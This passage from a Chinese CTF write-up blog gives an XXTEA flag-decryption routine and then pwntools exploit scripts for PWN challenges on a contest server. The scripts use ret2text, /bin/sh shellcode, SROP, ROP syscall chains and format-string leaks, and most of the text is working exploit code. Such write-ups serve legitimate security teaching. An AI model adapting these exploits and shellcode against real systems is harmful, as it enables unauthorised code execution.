class="string">&quot;十六进制表示:&quot;</span>, decrypted_data.<span class="built_in">hex</span>())</span><br></pre></td></tr></table></figure>

<h3 id="不劳春风解我忧"><a href="#不劳春风解我忧" class="headerlink" title="不劳春风解我忧"></a>不劳春风解我忧</h3><p>xxtea</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DELTA 0x9e3779b9</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MX (((z &gt;&gt; 5 ^ y <span class="string">&lt;&lt; 2) + (y &gt;</span>&gt; 3 ^ z &lt;&lt; 4)) ^ ((sum ^ y) + (key[(p &amp; 3) ^ e] ^ z)))</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MX2 (((z <span class="string">&lt;&lt; 5 ^ y &gt;</span>&gt; 2) + (y <span class="string">&lt;&lt; 3 ^ z &gt;</span>&gt; 4)) ^ ((sum ^ y) + (key2[(p &amp; 3) ^ e] ^ z)))</span></span><br><span class="line"></span><br><span class="line"><span class="type">uint32_t</span> key[]&#123; <span class="number">0x6e637466</span>, <span class="number">0x62ef0ed</span> ,<span class="number">0xa78c0b4f</span>, <span class="number">0x32303234</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">uint32_t</span> key2[]&#123; <span class="number">0x32303234</span>, <span class="number">0xd6eb12c3</span>, <span class="number">0x9f1cf72e</span>, <span class="number">0x4e435446</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">xxtea_decrypt1</span><span class="params">(<span class="type">uint32_t</span>* v, <span class="type">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">uint32_t</span> y, z, sum;</span><br><span class="line">    <span class="type">unsigned</span> rounds, e;</span><br><span class="line">    rounds = <span class="number">16</span>;</span><br><span class="line">    sum = DELTA * rounds;</span><br><span class="line">    y = v[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">        e = (sum &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> p = <span class="number">5</span> - <span class="number">1</span>; p &gt;= <span class="number">0</span>; p--)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (p == <span class="number">0</span>)</span><br><span class="line">                z = v[<span class="number">4</span>];</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                z = v[(p<span class="number">-1</span>)%<span class="number">5</span>];</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (p == <span class="number">4</span>)</span><br><span class="line">                y = v[<span class="number">0</span>];</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                y = v[p + <span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">            v[p] -= MX;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        sum -= DELTA;</span><br><span class="line">    &#125; <span class="keyword">while</span> (--rounds);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">xxtea_decrypt2</span><span class="params">(<span class="type">uint32_t</span>* v, <span class="type">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">uint32_t</span> y, z, sum;</span><br><span class="line">    <span class="type">unsigned</span> rounds, e;</span><br><span class="line">    rounds = <span class="number">16</span>;</span><br><span class="line">    sum = DELTA * rounds;</span><br><span class="line">    y = v[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">        e = (sum &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> p = <span class="number">5</span> - <span class="number">1</span>; p &gt;= <span class="number">0</span>; p--)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (p == <span class="number">0</span>)</span><br><span class="line">                z = v[<span class="number">4</span>];</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                z = v[(p - <span class="number">1</span>) % <span class="number">5</span>];</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (p == <span class="number">4</span>)</span><br><span class="line">                y = v[<span class="number">0</span>];</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                y = v[p + <span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">            v[p] -= MX2;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        sum -= DELTA;</span><br><span class="line">    &#125; <span class="keyword">while</span> (--rounds);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> enc1[] =</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="number">0x5D</span>, <span class="number">0x45</span>, <span class="number">0xD5</span>, <span class="number">0xB9</span>, <span class="number">0x8C</span>, <span class="number">0x95</span>, <span class="number">0x9C</span>, <span class="number">0x38</span>, <span class="number">0x3B</span>, <span class="number">0xB1</span>,</span><br><span class="line">      <span class="number">0x3E</span>, <span class="number">0x1E</span>, <span class="number">0x5F</span>, <span class="number">0xC8</span>, <span class="number">0xE8</span>, <span class="number">0xBB</span>, <span class="number">0x64</span>, <span class="number">0x38</span>, <span class="number">0x48</span>, <span class="number">0x69</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> enc2[] =</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="number">0xDE</span>, <span class="number">0x81</span>, <span class="number">0xD8</span>, <span class="number">0xAD</span>, <span class="number">0xC2</span>, <span class="number">0xC4</span>, <span class="number">0xA6</span>, <span class="number">0x32</span>, <span class="number">0x1C</span>, <span class="number">0xAB</span>,</span><br><span class="line">      <span class="number">0x61</span>, <span class="number">0x3E</span>, <span class="number">0xCB</span>, <span class="number">0xFF</span>, <span class="number">0xEF</span>, <span class="number">0xF1</span>, <span class="number">0x27</span>, <span class="number">0x30</span>, <span class="number">0x7A</span>, <span class="number">0x16</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">xxtea_decrypt1</span>((<span class="type">uint32_t</span>*)enc1, <span class="number">5</span>);</span><br><span class="line">    <span class="built_in">xxtea_decrypt2</span>((<span class="type">uint32_t</span>*)enc2, <span class="number">5</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%.20s%.20s\n&quot;</span>, enc1,enc2);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="击败abyssun"><a href="#击败abyssun" class="headerlink" title="击败abyssun"></a>击败abyssun</h3><p>真的在找锁血和控运行时间，没搞懂，最后想了下是不是都藏在内存中呢</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20250412135556060.png" alt="image-20250412135556060"></p>
<h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="浅红欺醉粉，肯信有江梅"><a href="#浅红欺醉粉，肯信有江梅" class="headerlink" title="浅红欺醉粉，肯信有江梅"></a>浅红欺醉粉，肯信有江梅</h3><p>NC cat即可</p>
<h3 id="领取你的小猫娘"><a href="#领取你的小猫娘" class="headerlink" title="领取你的小猫娘"></a>领取你的小猫娘</h3><p>ret2text</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">1</span>:</span><br><span class="line">    io = process(<span class="string">&#x27;./cat&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(<span class="string">&quot;challenge.qsnctf.com&quot;</span>,<span class="number">31013</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./cat&#x27;</span>)</span><br><span class="line"></span><br><span class="line">backdoor = <span class="number">0x40121B</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x58</span> + p64(backdoor)  </span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&quot;[+]hint:Virtual cat girl loves to eat characters&quot;</span>,payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="我觉君非池中物，咫尺蛟龙云雨"><a href="#我觉君非池中物，咫尺蛟龙云雨" class="headerlink" title="我觉君非池中物，咫尺蛟龙云雨"></a>我觉君非池中物，咫尺蛟龙云雨</h3><p>执行shellcode即可</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">1</span>:</span><br><span class="line">    io = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(<span class="string">&quot;challenge.qsnctf.com&quot;</span>,<span class="number">30886</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">b&#x27;\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(shellcode))</span><br><span class="line"></span><br><span class="line">io.sendafter(<span class="string">b&quot;arranged window.&quot;</span>,shellcode)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="江南无所有，聊赠一枝春"><a href="#江南无所有，聊赠一枝春" class="headerlink" title="江南无所有，聊赠一枝春"></a>江南无所有，聊赠一枝春</h3><p>需要栈对齐</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">1</span>:</span><br><span class="line">    io = process(<span class="string">&#x27;./gift&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(<span class="string">&quot;challenge.qsnctf.com&quot;</span>,<span class="number">31364</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./gift&#x27;</span>)</span><br><span class="line"></span><br><span class="line">backdoor = <span class="number">0x4011B6</span> </span><br><span class="line">ret_addr = <span class="number">0x4012C6</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x48</span> + p64(ret_addr) + p64(backdoor)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&quot;my gift?&quot;</span>,payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>



<h3 id="当时只道是寻常"><a href="#当时只道是寻常" class="headerlink" title="当时只道是寻常"></a>当时只道是寻常</h3><p>SROP</p>
<p>只有syscall，发现了binsh地址，构造ROP的话没有pop_rdi，只能SROP好像..</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">1</span>:</span><br><span class="line">    io = process(<span class="string">&#x27;./pwn01&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(<span class="string">&quot;challenge.qsnctf.com&quot;</span>,<span class="number">30832</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn01&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pop_rsi_pop_rax_ret = <span class="number">0x401049</span>  </span><br><span class="line">syscall_addr = <span class="number">0x401045</span></span><br><span class="line">binsh_addr = <span class="number">0x40203a</span></span><br><span class="line"></span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rax = <span class="number">59</span></span><br><span class="line">frame.rdi = binsh_addr</span><br><span class="line">frame.rsi = <span class="number">0</span></span><br><span class="line">frame.rdx = <span class="number">0</span></span><br><span class="line">frame.rip = syscall_addr</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">8</span></span><br><span class="line">payload += p64(pop_rsi_pop_rax_ret)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(<span class="number">0xf</span>)</span><br><span class="line">payload += p64(syscall_addr)</span><br><span class="line">payload += <span class="built_in">bytes</span>(frame)</span><br><span class="line"></span><br><span class="line">io.send(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="赌书消得泼茶香"><a href="#赌书消得泼茶香" class="headerlink" title="赌书消得泼茶香"></a>赌书消得泼茶香</h3><p>输入经过了一次base64decode，然后复制到dest，可造成栈溢出，注意要栈对齐</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">1</span>:</span><br><span class="line">    io = process(<span class="string">&#x27;./pwn02&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(<span class="string">&quot;challenge.qsnctf.com&quot;</span>,<span class="number">30767</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn02&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取system(&quot;/bin/sh&quot;)的地址，此处根据题目提供的信息填写</span></span><br><span class="line">target_addr = <span class="number">0x40141D</span></span><br><span class="line">ret_addr = <span class="number">0x401546</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>* <span class="number">0x68</span> + p64(ret_addr) + p64(target_addr) <span class="comment"># 填充至返回地址前</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Base64编码</span></span><br><span class="line">b64_payload = base64.b64encode(payload)</span><br><span class="line"><span class="built_in">print</span>(b64_payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动进程并发送payload</span></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;How are you feeling right now?&#x27;</span>, b64_payload)</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment"># payload += p64(ret_addr)</span></span><br></pre></td></tr></table></figure>

<h3 id="被酒莫惊春睡重"><a href="#被酒莫惊春睡重" class="headerlink" title="被酒莫惊春睡重"></a>被酒莫惊春睡重</h3><p>利用syscall，没有binsh则在栈上造一个</p>
<p>我们发现第一次泄露的地址跟在写诗里面的地址恰好一致，直接用即可</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20250410231153875.png" alt="image-20250410231153875"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    io = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(<span class="string">&quot;challenge.qsnctf.com&quot;</span>, <span class="number">32293</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;\xad\x97\x3a&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;abc&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;\xa5\xbd\x2c&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">stack_addr = <span class="built_in">int</span>(io.recv(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;stack_addr---&gt;&gt;&#x27;</span> + <span class="built_in">hex</span>(stack_addr))</span><br><span class="line"></span><br><span class="line">syscall_addr = <span class="number">0x4011ec</span></span><br><span class="line">pop_rsi_rdi_rax = <span class="number">0x4011e1</span></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;(1-3): &#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;/bin/sh\x00&#x27;</span> + <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x20</span> + p64(pop_rsi_rdi_rax) + p64(<span class="number">0</span>) + p64(stack_addr) + p64(<span class="number">59</span>) + p64(syscall_addr)</span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="铜雀春深锁二乔"><a href="#铜雀春深锁二乔" class="headerlink" title="铜雀春深锁二乔"></a>铜雀春深锁二乔</h3><p>aaaa %08x %08x %08x %08x %08x %08x %08x</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Pondering the past as I stand in the remnants of the setting sun.</span><br><span class="line">aaaa %08x %08x %08x %08x %08x %08x %08x</span><br><span class="line">aaaa 349c8f20 00000027 2ce2c7e2 00000041 2cf5b040 61616161 30252078good!</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20250410233743207.png" alt="image-20250410233743207"></p>
<p>可以泄露11和13,但是这个基址不知道是啥，看了下可能是main</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20250410233826177.png" alt="image-20250410233826177"></p>
<p>做了四个小时，想用栈迁移，最后试了下onegadget可能可行，在找可写区域又找了好久….</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    io = process(<span class="string">&#x27;./pwn03&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(<span class="string">&quot;challenge.qsnctf.com&quot;</span>, <span class="number">30592</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn03&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;sun&#x27;</span>)</span><br><span class="line">io.send(<span class="string">b&#x27;%11$p %13$p&#x27;</span>) </span><br><span class="line"></span><br><span class="line"><span class="comment"># 解析泄露的值</span></span><br><span class="line">io.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">canary = <span class="built_in">int</span>(io.recv(<span class="number">16</span>),<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;canary---&gt;&gt;&gt;&quot;</span> + <span class="built_in">hex</span>(canary))</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">stack_addr = <span class="built_in">int</span>(io.recv(<span class="number">12</span>), <span class="number">16</span>)</span><br><span class="line">libc_base = stack_addr - <span class="number">0x29d90</span></span><br><span class="line"><span class="comment"># libc_base = stack_addr - 128 + 176 - libc.sym[&#x27;__libc_start_main&#x27;]</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;libc_base---&gt;&quot;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;stack_addr---&gt;&quot;</span> + <span class="built_in">hex</span>(stack_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment"># io.recvuntil(&#x27;0x&#x27;)</span></span><br><span class="line"><span class="comment"># pie_addr = int(io.recv(12), 16) - 0x125b</span></span><br><span class="line"><span class="comment"># print(&quot;pie_addr---&gt;&quot; + hex(pie_addr))</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># sys_addr = pie_addr + 0x10D0</span></span><br><span class="line"><span class="comment"># ret_addr = pie_addr + 0x1234</span></span><br><span class="line"><span class="comment"># sys_addr = pie_addr + 0xebc81</span></span><br><span class="line"><span class="comment"># pop_rdi_ret = pie_addr + 0x1245</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># print(&quot;sys_addr---&gt;&gt;&quot; + hex(sys_addr))</span></span><br><span class="line"></span><br><span class="line">gadgets = [<span class="number">0xebc81</span>,<span class="number">0xebc85</span>,<span class="number">0xebc88</span>,<span class="number">0xebce2</span>,<span class="number">0xebd38</span>,<span class="number">0xebd3f</span>,<span class="number">0xebd43</span>]</span><br><span class="line">onegadget_offset = <span class="number">0xebd3f</span></span><br><span class="line">onegadget_addr = libc_base + onegadget_offset</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;onegadget ---&gt;&quot;</span>, <span class="built_in">hex</span>(onegadget_addr))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">8</span></span><br><span class="line">payload += 